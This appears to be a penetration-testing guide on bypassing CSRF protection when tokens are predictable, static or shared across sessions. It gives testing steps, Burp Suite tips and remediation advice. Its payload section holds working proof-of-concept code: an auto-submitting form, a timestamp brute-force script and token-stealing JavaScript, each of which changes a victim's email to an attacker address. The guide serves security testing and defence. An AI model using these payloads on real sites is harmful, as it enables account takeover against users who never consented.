# CSRF Token Bypass — Predictable Value

## Overview
CSRF tokens only provide protection when they are unpredictable — a cryptographically random value that an attacker cannot guess or derive. When developers implement CSRF tokens using weak sources of randomness (timestamps, user IDs, sequential numbers, MD5 hashes of predictable values, or static tokens that never change), an attacker can predict or obtain a valid token and include it in a forged request, completely defeating the CSRF protection. A token is only as strong as its entropy.

## How It Works
If the CSRF token is derived from or equal to any value the attacker can obtain or guess — such as the Unix timestamp at login, an MD5 of the username, a session ID that is also readable, or a static value embedded in JavaScript — the attacker can replicate a valid token. The attacker includes this predictable/obtained token in a forged request, and the server's validation succeeds because the token matches. Additionally, if the same CSRF token is reused across multiple sessions (not bound to a specific user's session), an attacker can use their own token in requests targeting other users.

## Impact
- Complete CSRF protection bypass despite token presence
- All state-changing actions vulnerable
- Account takeover and privilege escalation
- Financial fraud and data manipulation

## Where to Look
- CSRF tokens that appear in JavaScript source files as static values
- Tokens that look like MD5/SHA1 hashes (32 or 40 hex characters)
- Tokens that correlate to the timestamp when the page was loaded
- Tokens that are identical across multiple sessions/logins (not session-bound)
- Tokens embedded in HTTP responses that use predictable algorithms
- Tokens with low character set (e.g., numeric only, or very short length)
- CSRF tokens that are the same as or derived from the session cookie value
- Tokens that are the same for all users of the application

## Testing Steps
1. Log in with one account and note the CSRF token from a state-changing form.
2. Log in with a second account (or in another browser) and note its CSRF token.
3. Compare the two tokens — if they are identical, the token is not session-bound (critical flaw).
4. Log out and log in again with the same account — does the token change? If not, it is static.
5. Check if the token appears in JavaScript files accessible without authentication.
6. Attempt to use Account A's token in a request forged for Account B.
7. Analyze the token structure: is it a hash? Try computing `MD5(username)`, `MD5(session_id)`, `SHA1(email + secret)` patterns.
8. Check if the token equals the value of any other known quantity (user ID, timestamp, session prefix).
9. Use Burp Sequencer to analyze the randomness quality of observed tokens.
10. Test using your own token in a CSRF PoC — if the server validates it against the session, this bypass only works with token-reuse; if global static, it works for all users.

## Payloads / Techniques

**Test: Use your own valid token in a PoC targeting another user:**
```html
<!DOCTYPE html>
<html>
<body>
<!-- Use attacker's own valid CSRF token in the form -->
<!-- This works if token is not tied to a specific user's session -->
<form method="POST" action="https://victim.com/account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="csrf_token" value="ATTACKER_OWN_VALID_TOKEN">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

**Predictable timestamp-based token (token = Unix timestamp at login):**
```python
import time
import requests

# Attacker knows roughly when the victim logged in
# Brute-force timestamps in a range
target_session = "victim_session_cookie_value"
base_time = int(time.time())

for offset in range(-300, 300):  # 5 minute window
    candidate_token = str(base_time + offset)
    r = requests.post('https://victim.com/account/change-email',
                      cookies={'session': target_session},
                      data={'email': 'attacker@evil.com', 'csrf_token': candidate_token})
    if r.status_code == 200:
        print(f"Valid token found: {candidate_token}")
        break
```

**MD5-based token prediction (token = MD5(username)):**
```python
import hashlib

username = "john_doe"
predicted_token = hashlib.md5(username.encode()).hexdigest()
print(f"Predicted CSRF token: {predicted_token}")
```

**Static token in JavaScript — read from page source:**
```html
<script>
// Attacker reads the victim's page source to get the static token
fetch('https://victim.com/account', {credentials: 'include'})
  .then(r => r.text())
  .then(html => {
    var match = html.match(/csrf_token['":\s]+([a-f0-9]+)/);
    var token = match ? match[1] : null;
    if (token) {
      fetch('https://victim.com/account/change-email', {
        method: 'POST',
        credentials: 'include',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'email=attacker@evil.com&csrf_token=' + token
      });
    }
  });
</script>
```
Note: This requires CORS misconfiguration (`Access-Control-Allow-Origin: *` with `credentials: true`) or an XSS vulnerability to read the token.

**Burp Sequencer analysis setup:**
```
1. Capture a request containing the CSRF token
2. Right-click in Burp → "Send to Sequencer"
3. Highlight the CSRF token in the response
4. Click "Start live capture" — Burp fetches thousands of tokens
5. Click "Analyze now" to get entropy statistics
```

**cURL to test if same token works cross-session:**
```bash
# Login as user A, get token:
TOKEN="a1b2c3d4e5f6"
SESSION_A="session_a_cookie"
SESSION_B="session_b_cookie"

# Use A's token with B's session:
curl -X POST https://victim.com/account/change-email \
     -H "Cookie: session=$SESSION_B" \
     -d "email=test@test.com&csrf_token=$TOKEN"
```

## Burp Suite Tips
- Use **Burp Sequencer** to statistically analyze token entropy: send a request with the CSRF token to Sequencer, capture 100+ token samples, then run the analysis. A score below 100 bits of effective entropy is a red flag.
- In **Repeater**, grab your own session's CSRF token and try it in a request sent with a different session cookie to test cross-session reuse.
- Use **Burp Comparer** to visually compare CSRF tokens from multiple sessions side-by-side to spot patterns.
- Search JavaScript files in **HTTP history** for static token values using the Search feature.
- Use **Intruder** in "Sniper" mode with a numeric payload list to brute-force timestamp-based tokens on the CSRF token field.
- Decode tokens in **Burp Decoder** — base64 decoding often reveals hidden structure (e.g., `user_id:timestamp:md5`).

## Tools
- Burp Suite Pro (Sequencer, Comparer, Repeater, Intruder, Decoder)
- XSRFProbe — https://github.com/0xInfection/XSRFProbe
- Python/hashlib (for local token prediction)
- CyberChef — https://gchq.github.io/CyberChef/ (for token decoding and analysis)
- OWASP ZAP

## Remediation
- **Use cryptographically secure random number generation**: Generate tokens using CSPRNG: `os.urandom(32)` (Python), `crypto.randomBytes(32)` (Node.js), `SecureRandom` (Java).
- **Minimum entropy**: Tokens should have at least 128 bits of entropy (32 random bytes encoded as hex or base64).
- **Session-bound**: Tie every CSRF token to a specific user session. A token from Session A must be rejected when used with Session B.
- **Single-use or rotation**: Rotate CSRF tokens frequently (per-page-load or per-request for sensitive actions) so captured tokens have short validity windows.
- **Never use predictable values**: Do not derive CSRF tokens from user IDs, timestamps, email addresses, session IDs, or any other predictable input.
- **Use framework built-ins**: Django, Rails, Laravel, and ASP.NET all generate cryptographically secure session-bound tokens by default.

## References
https://portswigger.net/web-security/csrf/bypassing-csrf-defences
https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
https://portswigger.net/burp/documentation/desktop/tools/sequencer
https://owasp.org/www-community/attacks/csrf
